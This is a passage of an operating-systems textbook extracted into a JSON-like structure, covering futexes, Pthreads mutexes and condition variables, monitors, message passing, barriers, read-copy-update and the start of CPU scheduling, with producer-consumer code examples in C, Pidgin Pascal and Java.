per-process properties, whereas the threads\r\nwithin a single process share them. And it is always true that multiple processes\r\nsharing a common address space never hav e the efficiency of user-level threads\r\nsince the kernel is deeply involved in their management.\r\nFutexes\r\nWith increasing parallelism, efficient synchronization and locking is very im\u0002portant for performance. Spin locks are fast if the wait is short, but waste CPU\r\ncycles if not. If there is much contention, it is therefore more efficient to block the\r\nprocess and let the kernel unblock it only when the lock is free. Unfortunately, this\r\nhas the inverse problem: it works well under heavy contention, but continuously\r\nswitching to the kernel is expensive if there is very little contention to begin with.\r\nTo make matters worse, it may not be easy to predict the amount of lock con\u0002tention.\r\nOne interesting solution that tries to combine the best of both worlds is known\r\nas futex, or ‘‘fast user space mutex.’’ A futex is a feature of Linux that implements\r\nbasic locking (much like a mutex) but avoids dropping into the kernel unless it\nSEC. 2.3 INTERPROCESS COMMUNICATION 135\r\nreally has to. Since switching to the kernel and back is quite expensive, doing so\r\nimproves performance considerably. A futex consists of two parts: a kernel service\r\nand a user library. The kernel service provides a ‘‘wait queue’’ that allows multiple\r\nprocesses to wait on a lock. They will not run, unless the kernel explicitly un\u0002blocks them. For a process to be put on the wait queue requires an (expensive)\r\nsystem call and should be avoided. In the absence of contention, therefore, the\r\nfutex works completely in user space. Specifically, the processes share a common\r\nlock variable—a fancy name for an aligned 32-bit integer that serves as the lock.\r\nSuppose the lock is initially 1—which we assume to mean that the lock is free. A\r\nthread grabs the lock by performing an atomic ‘‘decrement and test’’ (atomic func\u0002tions in Linux consist of inline assembly wrapped in C functions and are defined in\r\nheader files). Next, the thread inspects the result to see whether or not the lock\r\nwas free. If it was not in the locked state, all is well and our thread has suc\u0002cessfully grabbed the lock. However, if the lock is held by another thread, our\r\nthread has to wait. In that case, the futex library does not spin, but uses a system\r\ncall to put the thread on the wait queue in the kernel. Hopefully, the cost of the\r\nswitch to the kernel is now justified, because the thread was blocked anyway.\r\nWhen a thread is done with the lock, it releases the lock with an atomic ‘‘increment\r\nand test’’ and checks the result to see if any processes are still blocked on the ker\u0002nel wait queue. If so, it will let the kernel know that it may unblock one or more of\r\nthese processes. If there is no contention, the kernel is not involved at all.\r\nMutexes in Pthreads\r\nPthreads provides a number of functions that can be used to synchronize\r\nthreads. The basic mechanism uses a mutex variable, which can be locked or\r\nunlocked, to guard each critical region. A thread wishing to enter a critical region\r\nfirst tries to lock the associated mutex. If the mutex is unlocked, the thread can\r\nenter immediately and the lock is atomically set, preventing other threads from\r\nentering. If the mutex is already locked, the calling thread is blocked until it is\r\nunlocked. If multiple threads are waiting on the same mutex, when it is unlocked,\r\nonly one of them is allowed to continue and relock it. These locks are not manda\u0002tory. It is up to the programmer to make sure threads use them correctly.\r\nThe major calls relating to mutexes are shown in Fig. 2-30. As expected,\r\nmutexes can be created and destroyed. The calls for performing these operations\r\nare pthread mutex init and pthread mutex destroy, respectively. They can also\r\nbe locked—by pthread mutex lock—which tries to acquire the lock and blocks if\r\nis already locked. There is also an option for trying to lock a mutex and failing\r\nwith an error code instead of blocking if it is already blocked. This call is\r\npthread mutex trylock. This call allows a thread to effectively do busy waiting if\r\nthat is ever needed. Finally, pthread mutex unlock unlocks a mutex and releases\r\nexactly one thread if one or more are waiting on it. Mutexes can also have attrib\u0002utes, but these are used only for specialized purposes.\n136 PROCESSES AND THREADS CHAP. 2\r\nThread call Description\r\nPthread mutex init Create a mutex\r\nPthread mutex destroy Destroy an existing mutex\r\nPthread mutex lock Acquire a lock or block\r\nPthread mutex tr ylock Acquire a lock or fail\r\nPthread mutex unlock Release a lock\r\nFigure 2-30. Some of the Pthreads calls relating to mutexes.\r\nIn addition to mutexes, Pthreads offers a second synchronization mechanism:\r\ncondition variables. Mutexes are good for allowing or blocking access to a criti\u0002cal region. Condition variables allow threads to block due to some condition not\r\nbeing met. Almost always the two methods are used together. Let us now look at\r\nthe interaction of threads, mutexes, and condition variables in a bit more detail.\r\nAs a simple example, consider the producer-consumer scenario again: one\r\nthread puts things in a buffer and another one takes them out. If the producer dis\u0002covers that there are no more free slots available in the buffer, it has to block until\r\none becomes available. Mutexes make it possible to do the check atomically with\u0002out interference from other threads, but having discovered that the buffer is full, the\r\nproducer needs a way to block and be awakened later. This is what condition vari\u0002ables allow.\r\nThe most important calls related to condition variables are shown in Fig. 2-31.\r\nAs you would probably expect, there are calls to create and destroy condition vari\u0002ables. They can have attributes and there are various calls for managing them (not\r\nshown). The primary operations on condition variables are pthread cond wait\r\nand pthread cond signal. The former blocks the calling thread until some other\r\nthread signals it (using the latter call). The reasons for blocking and waiting are\r\nnot part of the waiting and signaling protocol, of course. The blocking thread often\r\nis waiting for the signaling thread to do some work, release some resource, or per\u0002form some other activity. Only then can the blocking thread continue. The condi\u0002tion variables allow this waiting and blocking to be done atomically. The\r\npthread cond broadcast call is used when there are multiple threads potentially\r\nall blocked and waiting for the same signal.\r\nCondition variables and mutexes are always used together. The pattern is for\r\none thread to lock a mutex, then wait on a conditional variable when it cannot get\r\nwhat it needs. Eventually another thread will signal it and it can continue. The\r\npthread cond wait call atomically unlocks the mutex it is holding. For this rea\u0002son, the mutex is one of the parameters.\r\nIt is also worth noting that condition variables (unlike semaphores) have no\r\nmemory. If a signal is sent to a condition variable on which no thread is waiting,\r\nthe signal is lost. Programmers have to be careful not to lose signals.\nSEC. 2.3 INTERPROCESS COMMUNICATION 137\r\nThread call Description\r\nPthread cond init Create a condition var iable\r\nPthread cond destroy Destroy a condition var iable\r\nPthread cond wait Block waiting for a signal\r\nPthread cond signal Signal another thread and wake it up\r\nPthread cond broadcast Signal multiple threads and wake all of them\r\nFigure 2-31. Some of the Pthreads calls relating to condition variables.\r\nAs an example of how mutexes and condition variables are used, Fig. 2-32\r\nshows a very simple producer-consumer problem with a single buffer. When the\r\nproducer has filled the buffer, it must wait until the consumer empties it before pro\u0002ducing the next item. Similarly, when the consumer has removed an item, it must\r\nwait until the producer has produced another one. While very simple, this example\r\nillustrates the basic mechanisms. The statement that puts a thread to sleep should\r\nalways check the condition to make sure it is satisfied before continuing, as the\r\nthread might have been awakened due to a UNIX signal or some other reason."
          },
          "2.3.7 Monitors": {
            "page": 168,
            "content": "2.3.7 Monitors\r\nWith semaphores and mutexes interprocess communication looks easy, right?\r\nForget it. Look closely at the order of the downs before inserting or removing items\r\nfrom the buffer in Fig. 2-28. Suppose that the two downs in the producer’s code\r\nwere reversed in order, so mutex was decremented before empty instead of after it.\r\nIf the buffer were completely full, the producer would block, with mutex set to 0.\r\nConsequently, the next time the consumer tried to access the buffer, it would do a\r\ndown on mutex, now 0, and block too. Both processes would stay blocked forever\r\nand no more work would ever be done. This unfortunate situation is called a dead\u0002lock. We will study deadlocks in detail in Chap. 6.\r\nThis problem is pointed out to show how careful you must be when using sem\u0002aphores. One subtle error and everything comes to a grinding halt. It is like pro\u0002gramming in assembly language, only worse, because the errors are race condi\u0002tions, deadlocks, and other forms of unpredictable and irreproducible behavior.\r\nTo make it easier to write correct programs, Brinch Hansen (1973) and Hoare\r\n(1974) proposed a higher-level synchronization primitive called a monitor. Their\r\nproposals differed slightly, as described below. A monitor is a collection of proce\u0002dures, variables, and data structures that are all grouped together in a special kind\r\nof module or package. Processes may call the procedures in a monitor whenever\r\nthey want to, but they cannot directly access the monitor’s internal data structures\r\nfrom procedures declared outside the monitor. Figure 2-33 illustrates a monitor\r\nwritten in an imaginary language, Pidgin Pascal. C cannot be used here because\r\nmonitors are a language concept and C does not have them.\n138 PROCESSES AND THREADS CHAP. 2\r\n#include <stdio.h>\r\n#include <pthread.h>\r\n#define MAX 1000000000 /* how many numbers to produce */\r\npthread mutex t the mutex;\r\npthread cond t condc, condp; /* used for signaling */\r\nint buffer = 0; /* buffer used between producer and consumer */\r\nvoid *producer(void *ptr) /* produce data */\r\n{ int i;\r\nfor (i= 1; i <= MAX; i++) {\r\npthread mutex lock(&the mutex); /* get exclusive access to buffer */\r\nwhile (buffer != 0) pthread cond wait(&condp, &the mutex);\r\nbuffer = i; /* put item in buffer */\r\npthread cond signal(&condc); /* wake up consumer */\r\npthread mutex unlock(&the mutex); /* release access to buffer */\r\n}\r\npthread exit(0);\r\n}\r\nvoid *consumer(void *ptr) /* consume data */\r\n{ int i;\r\nfor (i = 1; i <= MAX; i++) {\r\npthread mutex lock(&the mutex); /* get exclusive access to buffer */\r\nwhile (buffer ==0 ) pthread cond wait(&condc, &the mutex);\r\nbuffer = 0; /* take item out of buffer */\r\npthread cond signal(&condp); /* wake up producer */\r\npthread mutex unlock(&the mutex); /* release access to buffer */\r\n}\r\npthread exit(0);\r\n}\r\nint main(int argc, char **argv)\r\n{\r\npthread t pro, con;\r\npthread mutex init(&the mutex, 0);\r\npthread cond init(&condc, 0);\r\npthread cond init(&condp, 0);\r\npthread create(&con, 0, consumer, 0);\r\npthread create(&pro, 0, producer, 0);\r\npthread join(pro, 0);\r\npthread join(con, 0);\r\npthread cond destroy(&condc);\r\npthread cond destroy(&condp);\r\npthread mutex destroy(&the mutex);\r\n}\r\nFigure 2-32. Using threads to solve the producer-consumer problem.\nSEC. 2.3 INTERPROCESS COMMUNICATION 139\r\nMonitors have an important property that makes them useful for achieving\r\nmutual exclusion: only one process can be active in a monitor at any instant. Moni\u0002tors are a programming-language construct, so the compiler knows they are special\r\nand can handle calls to monitor procedures differently from other procedure calls.\r\nTypically, when a process calls a monitor procedure, the first few instructions of\r\nthe procedure will check to see if any other process is currently active within the\r\nmonitor. If so, the calling process will be suspended until the other process has left\r\nthe monitor. If no other process is using the monitor, the calling process may enter.\r\nIt is up to the compiler to implement mutual exclusion on monitor entries, but\r\na common way is to use a mutex or a binary semaphore. Because the compiler, not\r\nthe programmer, is arranging for the mutual exclusion, it is much less likely that\r\nsomething will go wrong. In any event, the person writing the monitor does not\r\nhave to be aware of how the compiler arranges for mutual exclusion. It is suf\u0002ficient to know that by turning all the critical regions into monitor procedures, no\r\ntwo processes will ever execute their critical regions at the same time.\r\nAlthough monitors provide an easy way to achieve mutual exclusion, as we\r\nhave seen above, that is not enough. We also need a way for processes to block\r\nwhen they cannot proceed. In the producer-consumer problem, it is easy enough to\r\nput all the tests for buffer-full and buffer-empty in monitor procedures, but how\r\nshould the producer block when it finds the buffer full?\r\nThe solution lies in the introduction of condition variables, along with two\r\noperations on them, wait and signal. When a monitor procedure discovers that it\r\ncannot continue (e.g., the producer finds the buffer full), it does a wait on some\r\ncondition variable, say, full. This action causes the calling process to block. It also\r\nallows another process that had been previously prohibited from entering the moni\u0002tor to enter now. We saw condition variables and these operations in the context of\r\nPthreads earlier.\r\nThis other process, for example, the consumer, can wake up its sleeping part\u0002ner by doing a signal on the condition variable that its partner is waiting on. To\r\navoid having two active processes in the monitor at the same time, we need a rule\r\ntelling what happens after a signal. Hoare proposed letting the newly awakened\r\nprocess run, suspending the other one. Brinch Hansen proposed finessing the prob\u0002lem by requiring that a process doing a signal must exit the monitor immediately.\r\nIn other words, a signal statement may appear only as the final statement in a mon\u0002itor procedure. We will use Brinch Hansen’s proposal because it is conceptually\r\nsimpler and is also easier to implement. If a signal is done on a condition variable\r\non which several processes are waiting, only one of them, determined by the sys\u0002tem scheduler, is reviv ed.\r\nAs an aside, there is also a third solution, not proposed by either Hoare or\r\nBrinch Hansen. This is to let the signaler continue to run and allow the waiting\r\nprocess to start running only after the signaler has exited the monitor.\r\nCondition variables are not counters. They do not accumulate signals for later\r\nuse the way semaphores do. Thus, if a condition variable is signaled with no one\n140 PROCESSES AND THREADS CHAP. 2\r\nmonitor example\r\ninteger i;\r\ncondition c;\r\nprocedure producer( );\r\n.\r\n.\r\n.\r\nend;\r\nprocedure consumer( ); ...\r\nend;\r\nend monitor;\r\nFigure 2-33. A monitor.\r\nwaiting on it, the signal is lost forever. In other words, the wait must come before\r\nthe signal. This rule makes the implementation much simpler. In practice, it is not\r\na problem because it is easy to keep track of the state of each process with vari\u0002ables, if need be. A process that might otherwise do a signal can see that this oper\u0002ation is not necessary by looking at the variables.\r\nA skeleton of the producer-consumer problem with monitors is given in\r\nFig. 2-34 in an imaginary language, Pidgin Pascal. The advantage of using Pidgin\r\nPascal here is that it is pure and simple and follows the Hoare/Brinch Hansen\r\nmodel exactly.\r\nYou may be thinking that the operations wait and signal look similar to sleep\r\nand wakeup, which we saw earlier had fatal race conditions. Well, they are very\r\nsimilar, but with one crucial difference: sleep and wakeup failed because while one\r\nprocess was trying to go to sleep, the other one was trying to wake it up. With\r\nmonitors, that cannot happen. The automatic mutual exclusion on monitor proce\u0002dures guarantees that if, say, the producer inside a monitor procedure discovers that\r\nthe buffer is full, it will be able to complete the wait operation without having to\r\nworry about the possibility that the scheduler may switch to the consumer just be\u0002fore the wait completes. The consumer will not even be let into the monitor at all\r\nuntil the wait is finished and the producer has been marked as no longer runnable.\r\nAlthough Pidgin Pascal is an imaginary language, some real programming lan\u0002guages also support monitors, although not always in the form designed by Hoare\r\nand Brinch Hansen. One such language is Java. Java is an object-oriented lan\u0002guage that supports user-level threads and also allows methods (procedures) to be\r\ngrouped together into classes. By adding the keyword synchronized to a method\r\ndeclaration, Java guarantees that once any thread has started executing that method,\r\nno other thread will be allowed to start executing any other synchronized method\r\nof that object. Without synchronized, there are no guarantees about interleaving.\nSEC. 2.3 INTERPROCESS COMMUNICATION 141\r\nmonitor ProducerConsumer\r\ncondition full, empty;\r\ninteger count;\r\nprocedure insert(item: integer);\r\nbegin\r\nif count = N then wait(full);\r\ninsert item(item);\r\ncount := count + 1;\r\nif count = 1 then signal(empty)\r\nend;\r\nfunction remove: integer;\r\nbegin\r\nif count = 0 then wait(empty);\r\nremove = remove item;\r\ncount := count − 1;\r\nif count = N − 1 then signal(full)\r\nend;\r\ncount := 0;\r\nend monitor;\r\nprocedure producer;\r\nbegin\r\nwhile true do\r\nbegin\r\nitem = produce item;\r\nProducerConsumer.insert(item)\r\nend\r\nend;\r\nprocedure consumer;\r\nbegin\r\nwhile true do\r\nbegin\r\nitem = ProducerConsumer.remove;\r\nconsume item(item)\r\nend\r\nend;\r\nFigure 2-34. An outline of the producer-consumer problem with monitors. Only\r\none monitor procedure at a time is active. The buffer has N slots.\r\nA solution to the producer-consumer problem using monitors in Java is giv en\r\nin Fig. 2-35. Our solution has four classes. The outer class, ProducerConsumer,\r\ncreates and starts two threads, p and c. The second and third classes, producer and\r\nconsumer, respectively, contain the code for the producer and consumer. Finally,\r\nthe class our monitor, is the monitor. It contains two synchronized threads that\r\nare used for actually inserting items into the shared buffer and taking them out.\r\nUnlike the previous examples, here we have the full code of insert and remove.\n142 PROCESSES AND THREADS CHAP. 2\r\npublic class ProducerConsumer {\r\nstatic final int N = 100; // constant giving the buffer size\r\nstatic producer p = new producer( ); // instantiate a new producer thread\r\nstatic consumer c = new consumer( ); // instantiate a new consumer thread\r\nstatic our monitor mon = new our monitor( ); // instantiate a new monitor\r\npublic static void main(String args[ ]) {\r\np.star t( ); // star t the producer thread\r\nc.star t( ); // star t the consumer thread\r\n}\r\nstatic class producer extends Thread {\r\npublic void run( ) { // run method contains the thread code\r\nint item;\r\nwhile (true) { // producer loop\r\nitem = produce item( );\r\nmon.inser t(item);\r\n}\r\n}\r\npr ivate int produce item( ) { ... } // actually produce\r\n}\r\nstatic class consumer extends Thread {\r\npublic void run( ) { run method contains the thread code\r\nint item;\r\nwhile (true) { // consumer loop\r\nitem = mon.remove( );\r\nconsume item (item);\r\n}\r\n}\r\npr ivate void consume item(int item) { ... }// actually consume\r\n}\r\nstatic class our monitor { // this is a monitor\r\npr ivate int buffer[ ] = new int[N];\r\npr ivate int count = 0, lo = 0, hi = 0; // counters and indices\r\npublic synchronized void insert(int val) {\r\nif (count == N) go to sleep( ); // if the buffer is full, go to sleep\r\nbuffer [hi] = val; // inser t an item into the buffer\r\nhi = (hi + 1) % N; // slot to place next item in\r\ncount = count + 1; // one more item in the buffer now\r\nif (count == 1) notify( ); // if consumer was sleeping, wake it up\r\n}\r\npublic synchronized int remove( ) {\r\nint val;\r\nif (count == 0) go to sleep( ); // if the buffer is empty, go to sleep\r\nval = buffer [lo]; // fetch an item from the buffer\r\nlo = (lo + 1) % N; // slot to fetch next item from\r\ncount = count − 1; // one few items in the buffer\r\nif (count == N − 1) notify( ); // if producer was sleeping, wake it up\r\nretur n val;\r\n}\r\npr ivate void go to sleep( ) { try{wait( );} catch(Interr uptedException exc) {};}\r\n}\r\n}\r\nFigure 2-35. A solution to the producer-consumer problem in Java.\nSEC. 2.3 INTERPROCESS COMMUNICATION 143\r\nThe producer and consumer threads are functionally identical to their count\u0002erparts in all our previous examples. The producer has an infinite loop generating\r\ndata and putting it into the common buffer. The consumer has an equally infinite\r\nloop taking data out of the common buffer and doing some fun thing with it.\r\nThe interesting part of this program is the class our monitor, which holds the\r\nbuffer, the administration variables, and two synchronized methods. When the pro\u0002ducer is active inside insert, it knows for sure that the consumer cannot be active\r\ninside remove, making it safe to update the variables and the buffer without fear of\r\nrace conditions. The variable count keeps track of how many items are in the buff\u0002er. It can take on any value from 0 through and including N − 1. The variable lo is\r\nthe index of the buffer slot where the next item is to be fetched. Similarly, hi is the\r\nindex of the buffer slot where the next item is to be placed. It is permitted that\r\nlo = hi, which means that either 0 items or N items are in the buffer. The value of\r\ncount tells which case holds.\r\nSynchronized methods in Java differ from classical monitors in an essential\r\nway: Java does not have condition variables built in. Instead, it offers two proce\u0002dures, wait and notify, which are the equivalent of sleep and wakeup except that\r\nwhen they are used inside synchronized methods, they are not subject to race con\u0002ditions. In theory, the method wait can be interrupted, which is what the code sur\u0002rounding it is all about. Java requires that the exception handling be made explicit.\r\nFor our purposes, just imagine that go to sleep is the way to go to sleep.\r\nBy making the mutual exclusion of critical regions automatic, monitors make\r\nparallel programming much less error prone than using semaphores. Nevertheless,\r\nthey too have some drawbacks. It is not for nothing that our two examples of mon\u0002itors were in Pidgin Pascal instead of C, as are the other examples in this book. As\r\nwe said earlier, monitors are a programming-language concept. The compiler must\r\nrecognize them and arrange for the mutual exclusion somehow or other. C, Pascal,\r\nand most other languages do not have monitors, so it is unreasonable to expect\r\ntheir compilers to enforce any mutual exclusion rules. In fact, how could the com\u0002piler even know which procedures were in monitors and which were not?\r\nThese same languages do not have semaphores either, but adding semaphores\r\nis easy: all you need to do is add two short assembly-code routines to the library to\r\nissue the up and down system calls. The compilers do not even hav e to know that\r\nthey exist. Of course, the operating systems have to know about the semaphores,\r\nbut at least if you have a semaphore-based operating system, you can still write the\r\nuser programs for it in C or C++ (or even assembly language if you are masochis\u0002tic enough). With monitors, you need a language that has them built in.\r\nAnother problem with monitors, and also with semaphores, is that they were\r\ndesigned for solving the mutual exclusion problem on one or more CPUs that all\r\nhave access to a common memory. By putting the semaphores in the shared mem\u0002ory and protecting them with TSL or XCHG instructions, we can avoid races. When\r\nwe move to a distributed system consisting of multiple CPUs, each with its own\r\nprivate memory and connected by a local area network, these primitives become\n144 PROCESSES AND THREADS CHAP. 2\r\ninapplicable. The conclusion is that semaphores are too low lev el and monitors are\r\nnot usable except in a few programming languages. Also, none of the primitives\r\nallow information exchange between machines. Something else is needed."
          },
          "2.3.8 Message Passing": {
            "page": 175,
            "content": "2.3.8 Message Passing\r\nThat something else is message passing. This method of interprocess commu\u0002nication uses two primitives, send and receive, which, like semaphores and unlike\r\nmonitors, are system calls rather than language constructs. As such, they can easi\u0002ly be put into library procedures, such as\r\nsend(destination, &message);\r\nand\r\nreceive(source, &message);\r\nThe former call sends a message to a given destination and the latter one receives a\r\nmessage from a given source (or from ANY, if the receiver does not care). If no\r\nmessage is available, the receiver can block until one arrives. Alternatively, it can\r\nreturn immediately with an error code.\r\nDesign Issues for Message-Passing Systems\r\nMessage-passing systems have many problems and design issues that do not\r\narise with semaphores or with monitors, especially if the communicating processes\r\nare on different machines connected by a network. For example, messages can be\r\nlost by the network. To guard against lost messages, the sender and receiver can\r\nagree that as soon as a message has been received, the receiver will send back a\r\nspecial acknowledgement message. If the sender has not received the acknowl\u0002edgement within a certain time interval, it retransmits the message.\r\nNow consider what happens if the message is received correctly, but the ac\u0002knowledgement back to the sender is lost. The sender will retransmit the message,\r\nso the receiver will get it twice. It is essential that the receiver be able to distin\u0002guish a new message from the retransmission of an old one. Usually, this problem\r\nis solved by putting consecutive sequence numbers in each original message. If\r\nthe receiver gets a message bearing the same sequence number as the previous\r\nmessage, it knows that the message is a duplicate that can be ignored. Successfully\r\ncommunicating in the face of unreliable message passing is a major part of the\r\nstudy of computer networks. For more information, see Tanenbaum and Wetherall\r\n(2010).\r\nMessage systems also have to deal with the question of how processes are\r\nnamed, so that the process specified in a send or receive call is unambiguous.\r\nAuthentication is also an issue in message systems: how can the client tell that it\r\nis communicating with the real file server, and not with an imposter?\nSEC. 2.3 INTERPROCESS COMMUNICATION 145\r\nAt the other end of the spectrum, there are also design issues that are important\r\nwhen the sender and receiver are on the same machine. One of these is perfor\u0002mance. Copying messages from one process to another is always slower than\r\ndoing a semaphore operation or entering a monitor. Much work has gone into mak\u0002ing message passing efficient.\r\nThe Producer-Consumer Problem with Message Passing\r\nNow let us see how the producer-consumer problem can be solved with mes\u0002sage passing and no shared memory. A solution is given in Fig. 2-36. We assume\r\nthat all messages are the same size and that messages sent but not yet received are\r\nbuffered automatically by the operating system. In this solution, a total of N mes\u0002sages is used, analogous to the N slots in a shared-memory buffer. The consumer\r\nstarts out by sending N empty messages to the producer. Whenever the producer\r\nhas an item to give to the consumer, it takes an empty message and sends back a\r\nfull one. In this way, the total number of messages in the system remains constant\r\nin time, so they can be stored in a given amount of memory known in advance.\r\nIf the producer works faster than the consumer, all the messages will end up\r\nfull, waiting for the consumer; the producer will be blocked, waiting for an empty\r\nto come back. If the consumer works faster, then the reverse happens: all the mes\u0002sages will be empties waiting for the producer to fill them up; the consumer will be\r\nblocked, waiting for a full message.\r\nMany variants are possible with message passing. For starters, let us look at\r\nhow messages are addressed. One way is to assign each process a unique address\r\nand have messages be addressed to processes. A different way is to invent a new\r\ndata structure, called a mailbox. A mailbox is a place to buffer a certain number\r\nof messages, typically specified when the mailbox is created. When mailboxes are\r\nused, the address parameters in the send and receive calls are mailboxes, not proc\u0002esses. When a process tries to send to a mailbox that is full, it is suspended until a\r\nmessage is removed from that mailbox, making room for a new one.\r\nFor the producer-consumer problem, both the producer and consumer would\r\ncreate mailboxes large enough to hold N messages. The producer would send mes\u0002sages containing actual data to the consumer’s mailbox, and the consumer would\r\nsend empty messages to the producer’s mailbox. When mailboxes are used, the\r\nbuffering mechanism is clear: the destination mailbox holds messages that have\r\nbeen sent to the destination process but have not yet been accepted.\r\nThe other extreme from having mailboxes is to eliminate all buffering. When\r\nthis approach is taken, if the send is done before the receive, the sending process is\r\nblocked until the receive happens, at which time the message can be copied direct\u0002ly from the sender to the receiver, with no buffering. Similarly, if the receive is\r\ndone first, the receiver is blocked until a send happens. This strategy is often\r\nknown as a rendezvous. It is easier to implement than a buffered message scheme\r\nbut is less flexible since the sender and receiver are forced to run in lockstep.\n146 PROCESSES AND THREADS CHAP. 2\r\n#define N 100 /* number of slots in the buffer */\r\nvoid producer(void)\r\n{\r\nint item;\r\nmessage m; /* message buffer */\r\nwhile (TRUE) {\r\nitem = produce item( ); /* generate something to put in buffer */\r\nreceive(consumer, &m); /* wait for an empty to arrive */\r\nbuild message(&m, item); /* constr uct a message to send */\r\nsend(consumer, &m); /* send item to consumer */\r\n}\r\n}\r\nvoid consumer(void)\r\n{\r\nint item, i;\r\nmessage m;\r\nfor (i = 0; i < N; i++) send(producer, &m); /* send N empties */\r\nwhile (TRUE) {\r\nreceive(producer, &m); /* get message containing item */\r\nitem = extract item(&m); /* extract item from message */\r\nsend(producer, &m); /* send back empty reply */\r\nconsume item(item); /* do something with the item */\r\n}\r\n}\r\nFigure 2-36. The producer-consumer problem with N messages.\r\nMessage passing is commonly used in parallel programming systems. One\r\nwell-known message-passing system, for example, is MPI (Message-Passing\r\nInterface). It is widely used for scientific computing. For more information about\r\nit, see for example Gropp et al. (1994), and Snir et al. (1996)."
          },
          "2.3.9 Barriers": {
            "page": 177,
            "content": "2.3.9 Barriers\r\nOur last synchronization mechanism is intended for groups of processes rather\r\nthan two-process producer-consumer type situations. Some applications are divi\u0002ded into phases and have the rule that no process may proceed into the next phase\r\nuntil all processes are ready to proceed to the next phase. This behavior may be\r\nachieved by placing a barrier at the end of each phase. When a process reaches\r\nthe barrier, it is blocked until all processes have reached the barrier. This allows\r\ngroups of processes to synchronize. Barrier operation is illustrated in Fig. 2-37.\nSEC. 2.3 INTERPROCESS COMMUNICATION 147 Barrier Barrier Barrier\r\nA A A\r\nB B B\r\nC C\r\nD D D\r\nTime Time Time\r\nProcess\r\n(a) (b) (c)\r\nC\r\nFigure 2-37. Use of a barrier. (a) Processes approaching a barrier. (b) All proc\u0002esses but one blocked at the barrier. (c) When the last process arrives at the barri\u0002er, all of them are let through.\r\nIn Fig. 2-37(a) we see four processes approaching a barrier. What this means is\r\nthat they are just computing and have not reached the end of the current phase yet.\r\nAfter a while, the first process finishes all the computing required of it during the\r\nfirst phase. It then executes the barr ier primitive, generally by calling a library pro\u0002cedure. The process is then suspended. A little later, a second and then a third\r\nprocess finish the first phase and also execute the barr ier primitive. This situation is\r\nillustrated in Fig. 2-37(b). Finally, when the last process, C, hits the barrier, all the\r\nprocesses are released, as shown in Fig. 2-37(c).\r\nAs an example of a problem requiring barriers, consider a common relaxation\r\nproblem in physics or engineering. There is typically a matrix that contains some\r\ninitial values. The values might represent temperatures at various points on a sheet\r\nof metal. The idea might be to calculate how long it takes for the effect of a flame\r\nplaced at one corner to propagate throughout the sheet.\r\nStarting with the current values, a transformation is applied to the matrix to get\r\nthe second version of the matrix, for example, by applying the laws of thermody\u0002namics to see what all the temperatures are ΔT later. Then the process is repeated\r\nover and over, giving the temperatures at the sample points as a function of time as\r\nthe sheet heats up. The algorithm produces a sequence of matrices over time, each\r\none for a given point in time.\r\nNow imagine that the matrix is very large (for example, 1 million by 1 mil\u0002lion), so that parallel processes are needed (possibly on a multiprocessor) to speed\r\nup the calculation. Different processes work on different parts of the matrix, calcu\u0002lating the new matrix elements from the old ones according to the laws of physics.\r\nHowever, no process may start on iteration n + 1 until iteration n is complete, that\r\nis, until all processes have finished their current work. The way to achieve this goal\n148 PROCESSES AND THREADS CHAP. 2\r\nis to program each process to execute a barr ier operation after it has finished its\r\npart of the current iteration. When all of them are done, the new matrix (the input\r\nto the next iteration) will be finished, and all processes will be simultaneously re\u0002leased to start the next iteration."
          },
          "2.3.10 Avoiding Locks: Read-Copy-Update": {
            "page": 179,
            "content": "2.3.10 Avoiding Locks: Read-Copy-Update\r\nThe fastest locks are no locks at all. The question is whether we can allow for\r\nconcurrent read and write accesses to shared data structures without locking. In the\r\ngeneral case, the answer is clearly no. Imagine process A sorting an array of num\u0002bers, while process B is calculating the average. Because A moves the values back\r\nand forth across the array, B may encounter some values multiple times and others\r\nnot at all. The result could be anything, but it would almost certainly be wrong.\r\nIn some cases, however, we can allow a writer to update a data structure even\r\nthough other processes are still using it. The trick is to ensure that each reader ei\u0002ther reads the old version of the data, or the new one, but not some weird combina\u0002tion of old and new. As an illustration, consider the tree shown in Fig. 2-38.\r\nReaders traverse the tree from the root to its leaves. In the top half of the figure, a\r\nnew node X is added. To do so, we make the node ‘‘just right’’ before making it\r\nvisible in the tree: we initialize all values in node X, including its child pointers.\r\nThen, with one atomic write, we make X a child of A. No reader will ever read an\r\ninconsistent version. In the bottom half of the figure, we subsequently remove B\r\nand D. First, we make A’s left child pointer point to C. All readers that were in A\r\nwill continue with node C and never see B or D. In other words, they will see only\r\nthe new version. Likewise, all readers currently in B or D will continue following\r\nthe original data structure pointers and see the old version. All is well, and we\r\nnever need to lock anything. The main reason that the removal of B and D works\r\nwithout locking the data structure, is that RCU (Read-Copy-Update), decouples\r\nthe removal and reclamation phases of the update.\r\nOf course, there is a problem. As long as we are not sure that there are no more\r\nreaders of B or D, we cannot really free them. But how long should we wait? One\r\nminute? Ten? We hav e to wait until the last reader has left these nodes. RCU care\u0002fully determines the maximum time a reader may hold a reference to the data struc\u0002ture. After that period, it can safely reclaim the memory. Specifically, readers ac\u0002cess the data structure in what is known as a read-side critical section which may\r\ncontain any code, as long as it does not block or sleep. In that case, we know the\r\nmaximum time we need to wait. Specifically, we define a grace period as any time\r\nperiod in which we know that each thread to be outside the read-side critical sec\u0002tion at least once. All will be well if we wait for a duration that is at least equal to\r\nthe grace period before reclaiming. As the code in a read-side critical section is not\r\nallowed to block or sleep, a simple criterion is to wait until all the threads have ex\u0002ecuted a context switch.\nSEC."
          }
        }
      },
      "2.4 SCHEDULING": {
        "page": 180,
        "children": {
          "2.4.1 Introduction to Scheduling": {
            "page": 181,
            "content": "2.4.1 Introduction to Scheduling\r\nBack in the old days of batch systems with input in the form of card images on\r\na magnetic tape, the scheduling algorithm was simple: just run the next job on the\r\ntape. With multiprogramming systems, the scheduling algorithm became more\r\ncomplex because there were generally multiple users waiting for service. Some\r\nmainframes still combine batch and timesharing service, requiring the scheduler to\r\ndecide whether a batch job or an interactive user at a terminal should go next. (As\r\nan aside, a batch job may be a request to run multiple programs in succession, but\r\nfor this section, we will just assume it is a request to run a single program.) Be\u0002cause CPU time is a scarce resource on these machines, a good scheduler can make\r\na big difference in perceived performance and user satisfaction. Consequently, a\r\ngreat deal of work has gone into devising clever and efficient scheduling algo\u0002rithms.\r\nWith the advent of personal computers, the situation changed in two ways.\r\nFirst, most of the time there is only one active process. A user entering a docu\u0002ment on a word processor is unlikely to be simultaneously compiling a program in\r\nthe background. When the user types a command to the word processor, the sched\u0002uler does not have to do much work to figure out which process to run—the word\r\nprocessor is the only candidate.\r\nSecond, computers have gotten so much faster over the years that the CPU is\r\nrarely a scarce resource any more. Most programs for personal computers are lim\u0002ited by the rate at which the user can present input (by typing or 